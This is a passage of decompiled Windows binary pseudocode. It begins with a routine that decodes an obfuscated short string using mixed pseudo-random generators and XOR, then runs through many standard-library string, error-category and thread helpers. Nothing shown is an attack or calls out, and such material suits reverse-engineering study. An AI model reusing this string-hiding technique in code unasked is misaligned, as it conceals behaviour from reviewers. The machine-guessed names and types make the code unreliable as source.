  {
    v5 = byte_1400D98C8;
  }
  else
  {
    v4 = 69069 * dword_1400D98AC + 1234567;
    v1 = dword_1400D98CC | 1;
    dword_1400D98AC = v4;
    dword_1400D98CC |= 1u;
    dword_1400D98A4 = HIWORD(dword_1400D98A4) + 36969 * (unsigned __int16)dword_1400D98A4;
    LOBYTE(v4) = (BYTE2(dword_1400D98B0) + 80 * dword_1400D98B0) ^ v4;
    dword_1400D98B0 = HIWORD(dword_1400D98B0) + 18000 * (unsigned __int16)dword_1400D98B0;
    v5 = (((unsigned int)dword_1400D98A8 >> 13) ^ 32 * dword_1400D98A8 ^ dword_1400D98A8) + v4;
    dword_1400D98A8 ^= ((unsigned int)dword_1400D98A8 >> 13) ^ 32 * (dword_1400D98A8 ^ (dword_1400D98A8 << 12));
    byte_1400D98C8 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D98CC = v1 | 2;
    byte_1400D98D0[0] = v5 ^ 0x75;
    byte_1400D98D1 = (v5 - 1) ^ 0x73;
    byte_1400D98D3 = (v5 - 3) ^ 0x72;
    byte_1400D98D2 = (v5 - 2) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 4ui64 )
    sub_140004790(Src, 4ui64, 0i64);
  if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
    v6 = v3;
  else
    v6 = *(_DWORD **)v3;
  *v6 = 0;
  v7 = *((_QWORD *)v3 + 3) < 0x10ui64;
  *((_QWORD *)v3 + 2) = 4i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = *(_DWORD **)v3;
  *((_BYTE *)v8 + 4) = 0;
  v9 = 0i64;
  do
  {
    if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
      v10 = v3;
    else
      v10 = *(_DWORD **)v3;
    v11 = byte_1400D98D0[v9++];
    v12 = byte_1400D98C8 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 4 );
  return v3;
}
// 1400D98A4: using guessed type int dword_1400D98A4;
// 1400D98A8: using guessed type int dword_1400D98A8;
// 1400D98AC: using guessed type int dword_1400D98AC;
// 1400D98B0: using guessed type int dword_1400D98B0;
// 1400D98C8: using guessed type char byte_1400D98C8;
// 1400D98CC: using guessed type int dword_1400D98CC;
// 1400D98D1: using guessed type char byte_1400D98D1;
// 1400D98D2: using guessed type char byte_1400D98D2;
// 1400D98D3: using guessed type char byte_1400D98D3;

//----- (0000000140004720) ----------------------------------------------------
__int64 __fastcall sub_140004720(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rdi
  __int64 result; // rax

  v2 = a2;
  v3 = a1;
  if ( a2[3] >= 0x10ui64 )
  {
    if ( a1 )
      *a1 = *a2;
    *a2 = 0i64;
  }
  else if ( a2[2] != -1i64 )
  {
    memmove(a1, a2, a2[2] + 1i64);
  }
  v3[2] = v2[2];
  result = v2[3];
  v3[3] = result;
  v2[3] = 15i64;
  v2[2] = 0i64;
  *(_BYTE *)v2 = 0;
  return result;
}

//----- (0000000140004790) ----------------------------------------------------
void __fastcall sub_140004790(void *Src, unsigned __int64 a2, size_t a3)
{
  size_t v3; // rsi
  _QWORD *v4; // rbx
  unsigned __int64 v5; // rdi
  unsigned __int64 v6; // r8
  unsigned __int64 v7; // rcx
  unsigned __int64 v8; // rcx
  void *v9; // r14
  _QWORD *v10; // rdx

  v3 = a3;
  v4 = Src;
  v5 = a2 | 0xF;
  if ( (a2 | 0xF) <= 0xFFFFFFFFFFFFFFFEui64 )
  {
    v6 = *((_QWORD *)Src + 3);
    v7 = *((_QWORD *)Src + 3) >> 1;
    if ( v7 > (unsigned __int64)(v5 * (unsigned __int128)0xAAAAAAAAAAAAAAABui64 >> 64) >> 1 )
    {
      v5 = -2i64;
      if ( v6 <= -2i64 - v7 )
        v5 = v7 + v6;
    }
  }
  else
  {
    v5 = a2;
  }
  v8 = v5 + 1;
  v9 = 0i64;
  if ( v5 != -1i64 )
  {
    if ( v8 > 0xFFFFFFFFFFFFFFFFui64 || (v9 = operator new(v8)) == 0i64 )
      std::_Xbad_alloc();
  }
  if ( v3 )
  {
    v10 = v4[3] < 0x10ui64 ? v4 : *v4;
    if ( v3 )
      memcpy(v9, v10, v3);
  }
  if ( v4[3] >= 0x10ui64 )
    operator delete((void *)*v4);
  *(_BYTE *)v4 = 0;
  *v4 = v9;
  v4[3] = v5;
  v4[2] = v3;
  if ( v5 >= 0x10 )
    v4 = v9;
  *((_BYTE *)v4 + v3) = 0;
}
// 14009608D: using guessed type __int64 sub_14009608D(void);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (00000001400048A0) ----------------------------------------------------
void __fastcall sub_1400048A0(void *Src, unsigned __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  _QWORD *v4; // rbx
  unsigned __int64 v5; // rdi
  unsigned __int64 v6; // r8
  unsigned __int64 v7; // rcx
  unsigned __int64 v8; // rcx
  void *v9; // r14
  _QWORD *v10; // rdx

  v3 = a3;
  v4 = Src;
  v5 = a2 | 7;
  if ( (a2 | 7) <= 0x7FFFFFFFFFFFFFFEi64 )
  {
    v6 = *((_QWORD *)Src + 3);
    v7 = *((_QWORD *)Src + 3) >> 1;
    if ( v7 > (unsigned __int64)(v5 * (unsigned __int128)0xAAAAAAAAAAAAAAABui64 >> 64) >> 1 )
    {
      v5 = v7 + v6;
      if ( v6 > 9223372036854775806i64 - v7 )
        v5 = 9223372036854775806i64;
    }
  }
  else
  {
    v5 = a2;
  }
  v8 = v5 + 1;
  v9 = 0i64;
  if ( v5 != -1i64 )
  {
    if ( v8 > 0x7FFFFFFFFFFFFFFFi64 || (v9 = operator new(2 * v8)) == 0i64 )
      std::_Xbad_alloc();
  }
  if ( v3 )
  {
    v10 = v4[3] < 8ui64 ? v4 : *v4;
    if ( v3 )
      memcpy(v9, v10, 2 * v3);
  }
  if ( v4[3] >= 8ui64 )
    operator delete((void *)*v4);
  *v4 = v9;
  v4[3] = v5;
  v4[2] = v3;
  if ( v5 >= 8 )
    v4 = v9;
  *((_WORD *)v4 + v3) = 0;
}
// 14009611D: using guessed type __int64 sub_14009611D(void);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (00000001400049C0) ----------------------------------------------------
bool __fastcall sub_1400049C0(size_t *a1, unsigned __int64 a2, char a3)
{
  unsigned __int64 v3; // rdi
  size_t v4; // rbx
  unsigned __int64 v5; // rax
  size_t v6; // rsi
  void *v7; // r14

  v3 = a2;
  v4 = (size_t)a1;
  if ( a2 > 0xFFFFFFFFFFFFFFFEui64 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v5 = a1[3];
  if ( v5 >= a2 )
  {
    if ( a3 && a2 < 0x10 )
    {
      v6 = a1[2];
      if ( a2 < v6 )
        v6 = a2;
      if ( v5 >= 0x10 )
      {
        v7 = (void *)*a1;
        if ( v6 )
          memcpy(a1, (const void *)*a1, v6);
        operator delete(v7);
      }
      *(_QWORD *)(v4 + 16) = v6;
      *(_QWORD *)(v4 + 24) = 15i64;
      *(_BYTE *)(v6 + v4) = 0;
    }
    else if ( !a2 )
    {
      a1[2] = 0i64;
      if ( v5 >= 0x10 )
        v4 = *a1;
      *(_BYTE *)v4 = 0;
    }
  }
  else
  {
    sub_140004790(a1, a2, a1[2]);
  }
  return v3 != 0;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140004A90) ----------------------------------------------------
bool __fastcall sub_140004A90(__int64 *a1, unsigned __int64 a2, char a3)
{
  unsigned __int64 v3; // rdi
  __int64 v4; // rbx
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // r14
  void *v7; // rbp

  v3 = a2;
  v4 = (__int64)a1;
  if ( a2 > 0x7FFFFFFFFFFFFFFEi64 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v5 = a1[3];
  if ( v5 >= a2 )
  {
    if ( a3 && a2 < 8 )
    {
      v6 = a1[2];
      if ( a2 < v6 )
        v6 = a2;
      if ( v5 >= 8 )
      {
        v7 = (void *)*a1;
        if ( v6 )
          memcpy(a1, (const void *)*a1, 2 * v6);
        operator delete(v7);
      }
      *(_QWORD *)(v4 + 16) = v6;
      *(_QWORD *)(v4 + 24) = 7i64;
      *(_WORD *)(v4 + 2 * v6) = 0;
    }
    else if ( !a2 )
    {
      a1[2] = 0i64;
      if ( v5 >= 8 )
        v4 = *a1;
      *(_WORD *)v4 = 0;
    }
  }
  else
  {
    sub_1400048A0(a1, a2, a1[2]);
  }
  return v3 != 0;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140004B70) ----------------------------------------------------
_QWORD *__fastcall sub_140004B70(_QWORD *a1)
{
  _QWORD *result; // rax

  if ( a1[3] < 8ui64 )
    result = a1;
  else
    result = (_QWORD *)*a1;
  return result;
}

//----- (0000000140004B80) ----------------------------------------------------
_QWORD *__fastcall sub_140004B80(_QWORD *a1, _QWORD *a2, unsigned __int64 a3, size_t a4)
{
  unsigned __int64 v4; // rax
  size_t v5; // rsi
  unsigned __int64 v6; // rbp
  _QWORD *v7; // r14
  _QWORD *v8; // rbx
  size_t v9; // rax
  size_t v10; // r8
  unsigned __int64 v11; // rdi
  unsigned __int64 v12; // rax
  _QWORD *v13; // rcx
  bool v14; // cf
  _QWORD *v15; // rax

  v4 = a2[2];
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( v4 < a3 )
  {
    std::_Xout_of_range("invalid string position");
    __debugbreak();
  }
  v9 = v4 - a3;
  v10 = a1[2];
  if ( v9 < a4 )
    v5 = v9;
  if ( -1i64 - v10 <= v5 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  if ( v5 )
  {
    v11 = v10 + v5;
    if ( v10 + v5 > 0xFFFFFFFFFFFFFFFEui64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v12 = a1[3];
    if ( v12 >= v11 )
    {
      if ( !v11 )
      {
        a1[2] = 0i64;
        if ( v12 < 0x10 )
          *(_BYTE *)a1 = 0;
        else
          *(_BYTE *)*a1 = 0;
        return v8;
      }
    }
    else
    {
      sub_140004790(a1, v11, v10);
      if ( !v11 )
        return v8;
    }
    if ( v7[3] >= 0x10ui64 )
      v7 = (_QWORD *)*v7;
    if ( v8[3] < 0x10ui64 )
      v13 = v8;
    else
      v13 = (_QWORD *)*v8;
    if ( v5 )
      memcpy((char *)v13 + v8[2], (char *)v7 + v6, v5);
    v14 = v8[3] < 0x10ui64;
    v8[2] = v11;
    if ( v14 )
      v15 = v8;
    else
      v15 = (_QWORD *)*v8;
    *((_BYTE *)v15 + v11) = 0;
  }
  return v8;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140004CA0) ----------------------------------------------------
_QWORD *__fastcall sub_140004CA0(void *Src, void *a2, size_t Size)
{
  unsigned __int64 v3; // rsi
  void *v4; // rbp
  _QWORD *v5; // rbx
  unsigned __int64 v6; // r8
  void *v7; // rax
  _QWORD *v8; // rax
  size_t v10; // r8
  unsigned __int64 v11; // rdi
  unsigned __int64 v12; // rax
  _QWORD *v13; // rcx
  bool v14; // cf
  _QWORD *v15; // rax

  v3 = Size;
  v4 = a2;
  v5 = Src;
  if ( !a2 )
    goto LABEL_36;
  v6 = *((_QWORD *)Src + 3);
  v7 = v6 < 0x10 ? Src : *(_QWORD *)Src;
  if ( a2 < v7 )
    goto LABEL_36;
  if ( v6 >= 0x10 )
    Src = *(void **)Src;
  if ( (char *)Src + v5[2] <= a2 )
  {
LABEL_36:
    v10 = v5[2];
    if ( -1i64 - v10 <= v3 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    if ( !v3 )
      return v5;
    v11 = v10 + v3;
    if ( v10 + v3 > 0xFFFFFFFFFFFFFFFEui64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v12 = v5[3];
    if ( v12 >= v11 )
    {
      if ( v11 )
        goto LABEL_20;
      v5[2] = 0i64;
      if ( v12 < 0x10 )
        *(_BYTE *)v5 = 0;
      else
        *(_BYTE *)*v5 = 0;
    }
    else
    {
      sub_140004790(v5, v11, v10);
      if ( v11 )
      {
LABEL_20:
        if ( v5[3] < 0x10ui64 )
          v13 = v5;
        else
          v13 = (_QWORD *)*v5;
        if ( v3 )
          memcpy((char *)v13 + v5[2], v4, v3);
        v14 = v5[3] < 0x10ui64;
        v5[2] = v11;
        if ( v14 )
          v15 = v5;
        else
          v15 = (_QWORD *)*v5;
        *((_BYTE *)v15 + v11) = 0;
        return v5;
      }
    }
    return v5;
  }
  if ( v6 < 0x10 )
    v8 = v5;
  else
    v8 = (_QWORD *)*v5;
  return sub_140004B80(v5, v5, (_BYTE *)a2 - (_BYTE *)v8, v3);
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140004DF0) ----------------------------------------------------
void **__fastcall sub_140004DF0(void *Dst, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rdi
  unsigned __int64 v5; // rbp
  _QWORD *v6; // rsi
  void **v7; // rbx
  unsigned __int64 v8; // rdi
  unsigned __int64 v9; // rax
  bool v10; // cf
  unsigned __int64 v11; // rax
  void *v12; // rcx
  void **v13; // rax

  v4 = a2[2];
  v5 = a3;
  v6 = a2;
  v7 = (void **)Dst;
  if ( v4 < a3 )
  {
    std::_Xout_of_range("invalid string position");
    __debugbreak();
  }
  v8 = v4 - a3;
  if ( a4 < v8 )
    v8 = a4;
  if ( Dst == a2 )
  {
    v9 = v8 + a3;
    if ( *((_QWORD *)Dst + 2) < v8 + a3 )
    {
      std::_Xout_of_range("invalid string position");
      __debugbreak();
    }
    v10 = *((_QWORD *)Dst + 3) < 0x10ui64;
    *((_QWORD *)Dst + 2) = v9;
    if ( !v10 )
      Dst = *(void **)Dst;
    *((_BYTE *)Dst + v9) = 0;
    sub_140005230(v7, 0i64, a3);
  }
  else
  {
    if ( v8 > 0xFFFFFFFFFFFFFFFEui64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v11 = *((_QWORD *)Dst + 3);
    if ( v11 >= v8 )
    {
      if ( !v8 )
      {
        *((_QWORD *)Dst + 2) = 0i64;
        if ( v11 < 0x10 )
          *(_BYTE *)Dst = 0;
        else
          **(_BYTE **)Dst = 0;
        return v7;
      }
    }
    else
    {
      sub_140004790(Dst, v8, *((_QWORD *)Dst + 2));
      if ( !v8 )
        return v7;
    }
    if ( v6[3] >= 0x10ui64 )
      v6 = (_QWORD *)*v6;
    if ( (unsigned __int64)v7[3] < 0x10 )
      v12 = v7;
    else
      v12 = *v7;
    if ( v8 )
      memcpy(v12, (char *)v6 + v5, v8);
    v10 = (unsigned __int64)v7[3] < 0x10;
    v7[2] = (void *)v8;
    if ( v10 )
      v13 = v7;
    else
      v13 = (void **)*v7;
    *((_BYTE *)v13 + v8) = 0;
  }
  return v7;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140004F20) ----------------------------------------------------
void **__fastcall sub_140004F20(void *Dst, void *Src, size_t Size)
{
  unsigned __int64 v3; // rdi
  _BYTE *v4; // rsi
  size_t *v5; // rbx
  unsigned __int64 v6; // rdx
  _BYTE *v7; // rax
  _BYTE *v8; // rax
  void **result; // rax
  size_t v10; // rax
  void *v11; // rcx
  bool v12; // cf
  size_t v13; // rax

  v3 = Size;
  v4 = Src;
  v5 = (size_t *)Dst;
  if ( !Src )
    goto LABEL_34;
  v6 = *((_QWORD *)Dst + 3);
  v7 = v6 < 0x10 ? Dst : *(_QWORD *)Dst;
  if ( v4 < v7 )
    goto LABEL_34;
  if ( v6 >= 0x10 )
    Dst = *(void **)Dst;
  if ( (char *)Dst + v5[2] > v4 )
  {
    if ( v6 < 0x10 )
      v8 = v5;
    else
      v8 = (_BYTE *)*v5;
    result = sub_140004DF0(v5, v5, v4 - v8, Size);
  }
  else
  {
LABEL_34:
    if ( Size > 0xFFFFFFFFFFFFFFFEui64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v10 = v5[3];
    if ( v10 >= Size )
    {
      if ( !Size )
      {
        v5[2] = 0i64;
        if ( v10 < 0x10 )
        {
          result = (void **)v5;
          *(_BYTE *)v5 = 0;
        }
        else
        {
          *(_BYTE *)*v5 = 0;
          result = (void **)v5;
        }
        return result;
      }
    }
    else
    {
      sub_140004790(v5, v3, v5[2]);
    }
    if ( v3 )
    {
      if ( v5[3] < 0x10 )
        v11 = v5;
      else
        v11 = (void *)*v5;
      if ( v3 )
        memcpy(v11, v4, v3);
      v12 = v5[3] < 0x10;
      v5[2] = v3;
      if ( v12 )
        v13 = (size_t)v5;
      else
        v13 = *v5;
      *(_BYTE *)(v13 + v3) = 0;
    }
    result = (void **)v5;
  }
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140005050) ----------------------------------------------------
_QWORD *__fastcall sub_140005050(void *Src, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rdi
  unsigned __int64 v5; // rbp
  _QWORD *v6; // rsi
  _QWORD *v7; // rbx
  unsigned __int64 v8; // rdi
  unsigned __int64 v9; // rcx
  bool v10; // cf
  _WORD *v11; // rdx
  unsigned __int64 v12; // rcx
  void *v13; // rcx
  _QWORD *v14; // rcx

  v4 = a2[2];
  v5 = a3;
  v6 = a2;
  v7 = Src;
  if ( v4 < a3 )
  {
    std::_Xout_of_range("invalid string position");
    __debugbreak();
  }
  v8 = v4 - a3;
  if ( a4 < v8 )
    v8 = a4;
  if ( Src == a2 )
  {
    v9 = v8 + a3;
    if ( v7[2] < v8 + a3 )
    {
      std::_Xout_of_range("invalid string position");
      __debugbreak();
    }
    v10 = v7[3] < 8ui64;
    v7[2] = v9;
    if ( v10 )
      v11 = v7;
    else
      v11 = (_WORD *)*v7;
    v11[v9] = 0;
    sub_140005300(v7, 0i64, a3);
  }
  else
  {
    if ( v8 > 0x7FFFFFFFFFFFFFFEi64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v12 = *((_QWORD *)Src + 3);
    if ( v12 >= v8 )
    {
      if ( !v8 )
      {
        v7[2] = 0i64;
        if ( v12 < 8 )
          *(_WORD *)v7 = 0;
        else
          *(_WORD *)*v7 = 0;
        return v7;
      }
    }
    else
    {
      sub_1400048A0(v7, v8, v7[2]);
      if ( !v8 )
        return v7;
    }
    if ( v6[3] >= 8ui64 )
      v6 = (_QWORD *)*v6;
    if ( v7[3] < 8ui64 )
      v13 = v7;
    else
      v13 = (void *)*v7;
    if ( v8 )
      memcpy(v13, (char *)v6 + 2 * v5, 2 * v8);
    v10 = v7[3] < 8ui64;
    v7[2] = v8;
    if ( v10 )
      v14 = v7;
    else
      v14 = (_QWORD *)*v7;
    *((_WORD *)v14 + v8) = 0;
  }
  return v7;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140005190) ----------------------------------------------------
_QWORD *__fastcall sub_140005190(_QWORD *a1)
{
  _QWORD *result; // rax

  if ( a1[3] < 0x10ui64 )
    result = a1;
  else
    result = (_QWORD *)*a1;
  return result;
}

//----- (00000001400051A0) ----------------------------------------------------
__int64 __fastcall sub_1400051A0(__int64 a1, __int64 a2, int a3)
{
  int v3; // edi
  __int64 v4; // rbx
  const char *v5; // rax
  bool v6; // zf
  __int64 (__fastcall *(**v7)[2])(); // rax

  v3 = a3;
  v4 = a2;
  v5 = std::_Syserror_map(a3);
  *(_DWORD *)v4 = v3;
  v6 = v5 == 0i64;
  v7 = off_1400D8000;
  if ( v6 )
    v7 = &off_1400D8010;
  *(_QWORD *)(v4 + 8) = v7;
  return v4;
}
// 1400A1760: using guessed type const char *__stdcall std::_Syserror_map(_DWORD);
// 1400D8000: using guessed type __int64 (__fastcall *(*off_1400D8000[3])[2])();
// 1400D8010: using guessed type __int64 (__fastcall *(*off_1400D8010)[2])();

//----- (00000001400051F0) ----------------------------------------------------
bool __fastcall sub_1400051F0(__int64 a1, unsigned int a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rax
  char v6; // [rsp+20h] [rbp-18h]

  v3 = a3;
  v4 = (*(__int64 (__fastcall **)(__int64, char *, _QWORD))(*(_QWORD *)a1 + 24i64))(a1, &v6, a2);
  return *(_QWORD *)(v4 + 8) == *(_QWORD *)(v3 + 8) && *(_DWORD *)v4 == *(_DWORD *)v3;
}

//----- (0000000140005230) ----------------------------------------------------
_QWORD *__fastcall sub_140005230(_QWORD *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rdi
  _QWORD *v4; // rbx
  bool v5; // cf
  _QWORD *result; // rax
  _QWORD *v7; // rax
  __int64 v8; // rdi

  v3 = a1[2];
  v4 = a1;
  if ( v3 < a2 )
  {
    std::_Xout_of_range("invalid string position");
    __debugbreak();
  }
  if ( v3 - a2 > a3 )
  {
    if ( a3 )
    {
      if ( a1[3] < 0x10ui64 )
        v7 = a1;
      else
        v7 = (_QWORD *)*a1;
      v8 = v3 - a3;
      if ( v8 != a2 )
        memmove((char *)v7 + a2, (char *)v7 + a2 + a3, v8 - a2);
      v5 = v4[3] < 0x10ui64;
      v4[2] = v8;
      if ( !v5 )
      {
        *(_BYTE *)(*v4 + v8) = 0;
        return v4;
      }
      *((_BYTE *)v4 + v8) = 0;
    }
    result = v4;
  }
  else
  {
    v5 = a1[3] < 0x10ui64;
    a1[2] = a2;
    if ( v5 )
      *((_BYTE *)a1 + a2) = 0;
    else
      *(_BYTE *)(*a1 + a2) = 0;
    result = v4;
  }
  return result;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);

//----- (0000000140005300) ----------------------------------------------------
_QWORD *__fastcall sub_140005300(_QWORD *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rdi
  unsigned __int64 v4; // r9
  _QWORD *v5; // rbx
  bool v6; // cf
  _QWORD *result; // rax
  _QWORD *v8; // rax
  __int64 v9; // rdi
  _QWORD *v10; // rcx

  v3 = a1[2];
  v4 = a3;
  v5 = a1;
  if ( v3 < a2 )
  {
    std::_Xout_of_range("invalid string position");
    __debugbreak();
  }
  if ( v3 - a2 > a3 )
  {
    if ( a3 )
    {
      if ( a1[3] < 8ui64 )
        v8 = a1;
      else
        v8 = (_QWORD *)*a1;
      v9 = v3 - a3;
      if ( v9 != a2 )
        memmove((char *)v8 + 2 * a2, (char *)v8 + 2 * a2 + 2 * v4, 2 * (v9 - a2));
      v6 = v5[3] < 8ui64;
      v5[2] = v9;
      if ( v6 )
        v10 = v5;
      else
        v10 = (_QWORD *)*v5;
      *((_WORD *)v10 + v9) = 0;
    }
    result = v5;
  }
  else
  {
    v6 = a1[3] < 8ui64;
    a1[2] = a2;
    if ( !v6 )
      a1 = (_QWORD *)*a1;
    *((_WORD *)a1 + a2) = 0;
    result = v5;
  }
  return result;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);

//----- (00000001400053B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400053B0(__int64 a1, _QWORD *a2, int a3)
{
  size_t v3; // rbx
  _QWORD *v4; // rdi
  const char *v5; // rax
  char *v6; // rdx

  v3 = 0i64;
  v4 = a2;
  v5 = std::_Syserror_map(a3);
  v4[3] = 15i64;
  v4[2] = 0i64;
  v6 = "unknown error";
  if ( v5 )
    v6 = (char *)v5;
  *(_BYTE *)v4 = 0;
  if ( *v6 )
  {
    v3 = -1i64;
    do
      ++v3;
    while ( v6[v3] );
  }
  sub_140004F20(v4, v6, v3);
  return v4;
}
// 1400A1760: using guessed type const char *__stdcall std::_Syserror_map(_DWORD);

//----- (0000000140005420) ----------------------------------------------------
_QWORD *__fastcall sub_140005420(__int64 a1, _QWORD *a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a2;
  if ( a3 == 1 )
  {
    a2[3] = 15i64;
    a2[2] = 0i64;
    *(_BYTE *)a2 = 0;
    sub_140004F20(a2, "iostream stream error", 0x15ui64);
  }
  else
  {
    sub_1400053B0(a1, a2, a3);
  }
  return v3;
}

//----- (0000000140005470) ----------------------------------------------------
_QWORD *__fastcall sub_140005470(__int64 a1, _QWORD *a2, int a3)
{
  size_t v3; // rbx
  _QWORD *v4; // rdi
  const char *v5; // rax
  char *v6; // rdx

  v3 = 0i64;
  v4 = a2;
  v5 = std::_Winerror_map(a3);
  v4[3] = 15i64;
  v4[2] = 0i64;
  v6 = "unknown error";
  if ( v5 )
    v6 = (char *)v5;
  *(_BYTE *)v4 = 0;
  if ( *v6 )
  {
    v3 = -1i64;
    do
      ++v3;
    while ( v6[v3] );
  }
  sub_140004F20(v4, v6, v3);
  return v4;
}
// 1400A1758: using guessed type const char *__stdcall std::_Winerror_map(_DWORD);

//----- (00000001400054E0) ----------------------------------------------------
const char *sub_1400054E0()
{
  return "iostream";
}

//----- (00000001400054F0) ----------------------------------------------------
_QWORD *__fastcall sub_1400054F0(void *Src, _QWORD *a2)
{
  _QWORD *v2; // rdi
  char *v3; // rbx
  __int64 v4; // rbp
  unsigned __int64 v5; // rax
  char *v6; // rsi
  __int64 v7; // rax

  v2 = a2;
  v3 = (char *)Src;
  a2[3] = 15i64;
  a2[2] = 0i64;
  *(_BYTE *)a2 = 0;
  v4 = *((_QWORD *)Src + 2);
  if ( v4 )
  {
    v5 = *((_QWORD *)Src + 3);
    if ( v5 < 8 )
      v6 = (char *)Src;
    else
      v6 = *(char **)Src;
    if ( v5 >= 8 )
      v3 = *(char **)Src;
    v7 = sub_140031970(Src, a2);
    sub_140030D50(v3, &v6[2 * v4], v2, v7);
  }
  return v2;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);

//----- (0000000140005700) ----------------------------------------------------
struct _Thrd_imp_t *__fastcall sub_140005700(struct _Thrd_imp_t *a1, __int64 *a2, _QWORD *a3, _QWORD *a4)
{
  _QWORD *v4; // rdi
  __int64 *v5; // rsi
  struct _Thrd_imp_t *v6; // rbp
  _QWORD *v7; // rbx
  _QWORD *v8; // rax
  __int64 *v9; // rax
  volatile signed __int32 *v10; // rbx
  volatile signed __int32 *v11; // rbx
  char v13; // [rsp+20h] [rbp-A8h]
  volatile signed __int32 *v14; // [rsp+28h] [rbp-A0h]
  __int64 v15; // [rsp+30h] [rbp-98h]
  void *v16; // [rsp+38h] [rbp-90h]
  __int64 v17; // [rsp+48h] [rbp-80h]
  unsigned __int64 v18; // [rsp+50h] [rbp-78h]
  char v19; // [rsp+58h] [rbp-70h]
  volatile signed __int32 *v20; // [rsp+68h] [rbp-60h]
  void *v21; // [rsp+70h] [rbp-58h]
  __int64 v22; // [rsp+80h] [rbp-48h]
  unsigned __int64 v23; // [rsp+88h] [rbp-40h]

  v15 = -2i64;
  v4 = a3;
  v5 = a2;
  v6 = a1;
  v7 = sub_140005A20(&v13, a4);
  v8 = sub_140005A50(&v16, v4);
  v9 = sub_140005B90(&v19, *v5, v8, v7);
  sub_140005A90(v6, v9);
  if ( v23 >= 0x10 )
    operator delete(v21);
  v23 = 15i64;
  v22 = 0i64;
  LOBYTE(v21) = 0;
  v10 = v20;
  if ( v20 )
  {
    if ( !_InterlockedDecrement(v20 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v10 + 8i64))(v10);
      if ( !_InterlockedDecrement(v10 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v10 + 16i64))(v10);
    }
  }
  if ( v18 >= 0x10 )
    operator delete(v16);
  v18 = 15i64;
  v17 = 0i64;
  LOBYTE(v16) = 0;
  v11 = v14;
  if ( v14 )
  {
    if ( !_InterlockedDecrement(v14 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v11 + 8i64))(v11);
      if ( !_InterlockedDecrement(v11 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v11 + 16i64))(v11);
    }
  }
  return v6;
}

//----- (0000000140005840) ----------------------------------------------------
__int64 __fastcall sub_140005840(__int64 a1, _QWORD *a2)
{
  __int64 v2; // rsi
  __int64 v3; // r8
  _QWORD *v4; // rbx

  v2 = a1;
  *(_QWORD *)a1 = *a2;
  *(_QWORD *)(a1 + 8) = 0i64;
  v3 = a2[1];
  a2[1] = 0i64;
  *(_QWORD *)(a1 + 8) = v3;
  *a2 = 0i64;
  v4 = a2 + 2;
  *(_QWORD *)(a1 + 40) = 15i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_BYTE *)(a1 + 16) = 0;
  if ( a2[5] >= 0x10ui64 )
  {
    *(_QWORD *)(a1 + 16) = *v4;
    *v4 = 0i64;
  }
  else if ( a2[4] != -1i64 )
  {
    memmove((void *)(a1 + 16), a2 + 2, a2[4] + 1i64);
  }
  *(_QWORD *)(v2 + 32) = v4[2];
  *(_QWORD *)(v2 + 40) = v4[3];
  v4[3] = 15i64;
  v4[2] = 0i64;
  *(_BYTE *)v4 = 0;
  return v2;
}

//----- (0000000140005900) ----------------------------------------------------
__int64 __fastcall sub_140005900(__int64 a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rbx
  __int64 v4; // rsi
  __int64 v5; // r9

  v3 = a2;
  v4 = a1;
  *(_QWORD *)a1 = *a3;
